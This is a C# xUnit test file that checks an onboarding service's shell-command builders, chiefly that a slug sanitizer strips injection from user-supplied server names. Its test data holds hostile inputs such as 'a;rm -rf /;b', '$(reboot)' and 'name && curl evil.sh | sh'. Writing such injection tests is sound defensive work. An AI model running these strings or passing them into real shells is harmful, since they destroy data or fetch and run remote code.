using System.Text;
using Whiskers.Services.Onboarding;

namespace Whiskers.Tests;

/// <summary>W3 / C17: command-building tests for the onboarding flow (project rule: everything that
/// turns strings into shell commands gets string-assertion tests). The user-controlled input is the
/// server NAME — it must never reach a shell line except through the strict <c>Slug</c> allow-list;
/// file contents must only travel base64-encoded.</summary>
public class OnboardingCommandsTests
{
    // --- Slug: the single sanitizer between user input and the shell -----------------------------

    [Theory]
    [InlineData("Badwolf", "badwolf")]
    [InlineData("My Server 01", "my-server-01")]
    [InlineData("Über-Später!", "ber-sp-ter")]                    // non-ascii collapses, no specials survive
    [InlineData("a;rm -rf /;b", "a-rm-rf-b")]                     // injection attempt → hyphens
    [InlineData("$(reboot)", "reboot")]
    [InlineData("`whoami`", "whoami")]
    [InlineData("须弥", "server")]                                 // nothing usable → fixed fallback
    [InlineData("", "server")]
    public void Slug_is_a_strict_allow_list(string name, string expected)
        => Assert.Equal(expected, OnboardingCommands.Slug(name));

    [Theory]
    [InlineData("evil; touch /tmp/pwned")]
    [InlineData("name && curl evil.sh | sh")]
    [InlineData("name\"; reboot; \"")]
    public void Slug_output_never_contains_shell_metacharacters(string hostileName)
    {
        var slug = OnboardingCommands.Slug(hostileName);
        Assert.Matches("^[a-z0-9-]+$", slug);
    }

    // --- Command builders only ever see the slug ---------------------------------------------------

    [Fact]
    public void TailscaleUp_uses_the_slug_as_hostname()
    {
        var cmd = OnboardingCommands.TailscaleUp(OnboardingCommands.Slug("My Server!"));
        Assert.Equal("sudo systemd-run --collect --unit=ts-up tailscale up --accept-dns=false --hostname=my-server", cmd);
    }

    [Fact]
    public void CertCreate_builds_paths_and_sans_from_slug_and_ip()
    {
        var cmd = OnboardingCommands.CertCreate("step-ca", "badwolf", "100.64.0.7");
        Assert.Contains("docker exec step-ca step certificate create badwolf-dockerproxy", cmd);
        Assert.Contains("/home/step/certs/badwolf-server.crt", cmd);
        Assert.Contains("--san 100.64.0.7 --san badwolf", cmd);
        Assert.Contains("--not-after 8760h", cmd);
        // no quoting characters needed — inputs are slug/IP-validated upstream
        Assert.DoesNotContain("\"", cmd);
    }

    [Fact]
    public void WriteFileB64_pipes_base64_through_tee_and_creates_the_directory()
    {
        var b64 = Convert.ToBase64String(Encoding.UTF8.GetBytes("services: {}\n"));
        var cmd = OnboardingCommands.WriteFileB64("/opt/telemetry/docker-compose.yml", b64);
        Assert.Equal($"sudo mkdir -p /opt/telemetry && echo {b64} | base64 -d | sudo tee /opt/telemetry/docker-compose.yml >/dev/null", cmd);
    }

    [Fact]
    public void WriteFileB64_content_never_appears_raw_in_the_command()
    {
        var hostile = "services:\n  x:\n    image: $(reboot)\n";
        var cmd = OnboardingCommands.WriteFileB64("/opt/x/y.yml",
            Convert.ToBase64String(Encoding.UTF8.GetBytes(hostile)));
        Assert.DoesNotContain("$(reboot)", cmd);
    }

    [Fact]
    public void AddScrapeTarget_ships_python_base64_encoded()
    {
        var cmd = OnboardingCommands.AddScrapeTargetCommand("/opt/telemetry-vm/scrape.yml", "srv-1", "100.64.0.7");
        Assert.StartsWith("echo ", cmd);
        Assert.EndsWith("| base64 -d | python3 -", cmd);
        // decode round-trip: the payload contains the ip + server id, the shell line does not
        var b64 = cmd.Split(' ')[1];
        var py = Encoding.UTF8.GetString(Convert.FromBase64String(b64));
        Assert.Contains("ip='100.64.0.7'; sid='srv-1'", py);
        Assert.DoesNotContain("100.64.0.7:9100", cmd.Replace(b64, ""));
    }

    // --- Compose templates -------------------------------------------------------------------------

    [Fact]
    public void NodeExporterCompose_binds_to_the_tailnet_ip_only()
    {
        var yml = OnboardingCommands.NodeExporterCompose("100.64.0.7");
        Assert.Contains("--web.listen-address=100.64.0.7:9100", yml);
        Assert.DoesNotContain("0.0.0.0:9100", yml);
    }

    [Fact]
    public void DockerProxyCompose_publishes_2376_on_the_tailnet_ip_and_keeps_dangerous_verbs_off()
    {
        var yml = OnboardingCommands.DockerProxyCompose("100.64.0.7");
        Assert.Contains("'100.64.0.7:2376:2376'", yml);
        Assert.Contains("EXEC: 0", yml);
        Assert.Contains("SYSTEM: 0", yml);
        Assert.Contains("--allow-cn=serverwatch-client", yml);
    }

    // --- Step metadata -----------------------------------------------------------------------------

    [Fact]
    public void Every_step_has_an_actionable_hint()
    {
        foreach (var step in Enum.GetValues<OnboardingStep>())
            Assert.False(string.IsNullOrWhiteSpace(OnboardingResult.Hint(step)));
    }
}
